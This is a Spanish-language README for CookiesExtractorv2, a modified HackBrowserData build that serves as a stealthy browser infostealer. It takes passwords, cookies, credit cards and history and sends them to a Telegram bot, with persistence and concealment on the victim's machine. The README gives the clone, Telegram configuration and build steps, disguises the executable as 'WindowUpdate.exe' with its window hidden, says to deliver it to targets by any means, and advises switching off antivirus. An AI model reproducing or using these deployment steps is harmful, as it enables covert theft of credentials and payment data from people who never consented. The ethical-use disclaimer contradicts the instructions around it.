<h1>CookiesExtractorv2</h1>
CookiesExtractorv2 es una herramienta desarrollada en Go diseñada para extraer datos sensibles de navegadores web (contraseñas, historial, cookies, marcadores, tarjetas de crédito, historial de descargas, localStorage y extensiones). A diferencia de la herramienta base, esta versión opera de forma discreta en segundo plano, recolecta los datos extraídos y los envía automáticamente a un bot de Telegram configurado. Soporta los navegadores más populares en Windows, macOS y Linux, e incluye mecanismos para su persistencia y ocultamiento en el sistema objetivo.

*#
> Advertencia Importante:
Esta herramienta es una modificación del proyecto original HackBrowserData y ha sido configurada para operar de manera autónoma, recolectando datos de navegación y enviándolos a un destino remoto (Telegram). Su uso implica la extracción y transmisión de información sensible del sistema donde se ejecuta. Esta herramienta está destinada EXCLUSIVAMENTE para fines de investigación de seguridad y pruebas de penetración ÉTICAS en entornos controlados y con el CONSENTIMIENTO EXPLÍCITO Y DOCUMENTADO del propietario del sistema. Cualquier uso no autorizado de este software para acceder, recopilar o exfiltrar datos sin el permiso expreso del propietario del sistema es ILEGAL y NO ÉTICO. El autor y los contribuidores no asumen ninguna responsabilidad legal o moral por cualquier uso indebido o ilegal de esta herramienta.

Navegadores Compatibles

### Windows
| Browser            | Password | Cookie | Bookmark | History |
|:-------------------|:--------:|:------:|:--------:|:-------:|
| Google Chrome      |    ✅     |   ✅    |    ✅     |    ✅    |
| Google Chrome Beta |    ✅     |   ✅    |    ✅     |    ✅    |
| Chromium           |    ✅     |   ✅    |    ✅     |    ✅    |
| Microsoft Edge     |    ✅     |   ✅    |    ✅     |    ✅    |
| 360 Speed          |    ✅     |   ✅    |    ✅     |    ✅    |
| QQ                 |    ✅     |   ✅    |    ✅     |    ✅    |
| Brave              |    ✅     |   ✅    |    ✅     |    ✅    |
| Opera              |    ✅     |   ✅    |    ✅     |    ✅    |
| OperaGX            |    ✅     |   ✅    |    ✅     |    ✅    |
| Vivaldi            |    ✅     |   ✅    |    ✅     |    ✅    |
| Yandex             |    ✅     |   ✅    |    ✅     |    ✅    |
| CocCoc             |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox            |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Beta       |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Dev        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox ESR        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Nightly    |    ✅     |   ✅    |    ✅     |    ✅    |
| Internet Explorer  |    ❌     |   ❌    |    ❌     |    ❌    |


### MacOS

Based on Apple's security policy, some browsers **require a current user password** to decrypt.

| Browser            | Password | Cookie | Bookmark | History |
|:-------------------|:--------:|:------:|:--------:|:-------:|
| Google Chrome      |    ✅     |   ✅    |    ✅     |    ✅    |
| Google Chrome Beta |    ✅     |   ✅    |    ✅     |    ✅    |
| Chromium           |    ✅     |   ✅    |    ✅     |    ✅    |
| Microsoft Edge     |    ✅     |   ✅    |    ✅     |    ✅    |
| Brave              |    ✅     |   ✅    |    ✅     |    ✅    |
| Opera              |    ✅     |   ✅    |    ✅     |    ✅    |
| OperaGX            |    ✅     |   ✅    |    ✅     |    ✅    |
| Vivaldi            |    ✅     |   ✅    |    ✅     |    ✅    |
| CocCoc             |    ✅     |   ✅    |    ✅     |    ✅    |
| Yandex             |    ✅     |   ✅    |    ✅     |    ✅    |
| Arc                |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox            |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Beta       |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Dev        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox ESR        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Nightly    |    ✅     |   ✅    |    ✅     |    ✅    |
| Safari             |    ❌     |   ❌    |    ❌     |    ❌    |

### Linux

| Browser            | Password | Cookie | Bookmark | History |
|:-------------------|:--------:|:------:|:--------:|:-------:|
| Google Chrome      |    ✅     |   ✅    |    ✅     |    ✅    |
| Google Chrome Beta |    ✅     |   ✅    |    ✅     |    ✅    |
| Chromium           |    ✅     |   ✅    |    ✅     |    ✅    |
| Microsoft Edge Dev |    ✅     |   ✅    |    ✅     |    ✅    |
| Brave              |    ✅     |   ✅    |    ✅     |    ✅    |
| Opera              |    ✅     |   ✅    |    ✅     |    ✅    |
| Vivaldi            |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox            |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Beta       |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Dev        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox ESR        |    ✅     |   ✅    |    ✅     |    ✅    |
| Firefox Nightly    |    ✅     |   ✅    |    ✅     |    ✅    |


Instalación
La instalación de CookiesExtractorv2 es muy sencilla:
Descarga el proyecto o clona el repositorio

# Clona tu repositorio
git clone https://github.com/GrpDsG20/CookiesExtractorv2

Configura tu bot de Telegram:
Antes de compilar, necesitas editar el archivo main.go en la ruta cmd/hack-browser-data/main.go. Busca las líneas TelegramToken y ChatID y reemplaza los valores por tu propio token de bot de Telegram y el ID de tu chat.

const (
    TelegramToken   = "TU_TOKEN_DE_BOT_AQUI" // Reemplaza esto con tu token real
    ChatID          = "TU_CHAT_ID_AQUI"     // Reemplaza esto con tu ID de chat real
    TelegramFileAPI = "https://api.telegram.org/bot%s/sendDocument"
)

# Navega a la raíz de tu proyecto
cd CookiesExtractorv2

# Inicializa y limpia tu módulo (si aún no lo has hecho)
go mod tidy

# Navega hasta este apartado
cd cmd\hack-browser-data

# Compila el ejecutable (desde la raíz del módulo)
go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe

# Envia el .exe por cualquier medio descargalo y ejecutalo 

Nota: En algunas situaciones, esta herramienta de seguridad puede ser detectada como un virus por Windows Defender u otro software antivirus y no podrá ejecutarse. Es recomendable desactivar el antivirus temporalmente, como si instalaras cualquier programa "crackeado". El código es de código abierto, puedes modificarlo y compilarlo tú mismo. Ten en cuenta que esta versión modificada está diseñada para operar de forma sigilosa y enviar datos a un bot de Telegram, lo cual es la razón principal de tales detecciones.


Compilación cruzada (Cross compile)
Aquí tienes un ejemplo de cómo usar macOS para compilar para Windows y Linux. Asegúrate de estar en la raíz de tu módulo (CookiesExtractorv2) cuando ejecutes estos comandos.

Para Windows
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe ./cmd/hack-browser-data

Para Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o WindowUpdate ./cmd/hack-browser-data

Ejecución
Importante: Esta versión de la herramienta está diseñada para ejecutarse de forma sigilosa en segundo plano. Los ejemplos de comandos que se muestran a continuación corresponden al comportamiento de la herramienta original para exportación local y para fines de depuración o prueba de sus capacidades de extracción, no a la operación normal de esta versión modificada.


